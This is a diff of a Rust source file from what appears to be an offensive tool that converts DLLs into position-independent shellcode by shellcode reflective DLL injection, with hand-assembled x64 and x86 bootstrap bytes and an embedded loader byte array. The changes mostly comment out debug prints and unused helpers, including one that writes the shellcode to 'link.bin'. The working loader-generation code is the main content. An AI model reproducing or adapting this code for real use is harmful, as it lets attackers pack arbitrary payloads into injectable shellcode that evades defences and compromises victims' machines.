@@ -1,5 +1,5 @@
 use byteorder::{ByteOrder, LittleEndian, ReadBytesExt};
-use std::io::prelude::*;
+//use std::io::prelude::*;
 use std::{fs, path, process};
 //some functions are not used now but we may want to use them later
 #[allow(dead_code)] //copilot added this based on above comment. (good job)
@@ -64,6 +64,8 @@ pub fn shellcode_rdi(dll_path: &str, function_name: &str, user_data: String) -> 
     convert_to_shellcode(dll, hash_function, user_data.into_bytes(), flags)
 }
 
+//this function is not used now but we may want to use it later
+/* 
 pub fn shellcode_rdi_from_bytes(
     dll_bytes: Vec<u8>,
     function_name: String,
@@ -83,7 +85,7 @@ pub fn shellcode_rdi_from_bytes(
     }
     convert_to_shellcode(dll_bytes, hash_function, user_data.into_bytes(), flags)
 }
-
+*/
 pub fn convert_to_shellcode(
     dll_bytes: Vec<u8>,
     function_hash: [u8; 4],
@@ -354,12 +356,22 @@ pub fn convert_to_shellcode(
         0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x10,
         0x5F, 0xC3,
     ];
+    
+
+    //print user data
     let user_data = if user_data_.is_empty() {
         "None".as_bytes().to_vec()
     } else {
         user_data_
     };
     let mut final_shellcode: Vec<u8> = Vec::new();
+
+    //print function hash
+    //println!("Converting to shellcode:");
+    //println!("- Function hash: {:?}", function_hash);
+    //println!("- DLL size: {} bytes", dll_bytes.len());
+    //println!("- User data size: {} bytes", &user_data.len());
+    //println!("- Flags: {}", flags);
 
     if is_64bit_dll(&dll_bytes) {
         // x64
@@ -371,18 +383,18 @@ pub fn convert_to_shellcode(
 
         // Set the offset to our DLL from pop result
         let dll_offset = bootstrap_size - bootstrap.len() + rdi_shellcode_64.len();
-        //let dll_offset_bytes = dll_offset.to_le_bytes();
-        
+        //println!("DLL offset: 0x{:X} ({} bytes)", dll_offset, dll_offset);
+
         // pop rcx - Capture our current location in memory
         bootstrap.extend_from_slice(&[0x59]);
-        
+
         // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
         bootstrap.extend_from_slice(&[0x49, 0x89, 0xc8]);
 
         // add rcx, <Offsett of the DLL>
         bootstrap.extend_from_slice(&[0x48, 0x81, 0xc1]);
         bootstrap.extend_from_slice(&pack(dll_offset as u32));
-       // println!("DLL Offset: {}", dll_offset);
+        // println!("DLL Offset: {}", dll_offset);
 
         // mov edx, <Hash of function>
         bootstrap.extend_from_slice(&[0xba]);
@@ -392,6 +404,7 @@ pub fn convert_to_shellcode(
         // add r8, <Offset of the DLL> + <Length of DLL>
         bootstrap.extend_from_slice(&[0x49, 0x81, 0xc0]);
         let user_data_location = dll_offset + dll_bytes.len();
+        //println!("User data offset: 0x{:X} ({} bytes)", user_data_location, user_data_location);
         bootstrap.extend_from_slice(&pack(user_data_location as u32));
 
         // mov r9d, <Length of User Data>
@@ -444,9 +457,12 @@ pub fn convert_to_shellcode(
         //print!("DLL Size: {}", dll_bytes.len());
         final_shellcode.extend_from_slice(&user_data);
         //println!("User Data Size: {}", user_data.len());
+        //println!("Bootstrap size: {} bytes", bootstrap_size);
+        //println!("RDI shellcode size: {} bytes", rdi_shellcode_64.len());
+        //println!("DLL size: {} bytes", dll_bytes.len());
+        //println!("User data size: {} bytes", user_data.len());
 
         //find the shellcode offset
-
     } else {
         // x86
         let bootstrap_size = 45;
@@ -514,17 +530,6 @@ pub fn convert_to_shellcode(
         final_shellcode.extend_from_slice(&dll_bytes);
         final_shellcode.extend_from_slice(&user_data);
     }
-    //println!("Final Shellcode Size: {}", final_shellcode.len());
+
     final_shellcode
-
-}
-
-pub fn shellcode_rdi_to_file(dll_path: &str, function_name: &str) {
-    let shellcode = shellcode_rdi(dll_path, function_name, String::from(""));
-    // write shellcode to file
-    let mut shellcode_file =
-        fs::File::create("link.bin").expect("Error opening file to write shellcode");
-    shellcode_file
-        .write_all(&shellcode)
-        .expect("Could not write contents to shellcode file");
 }
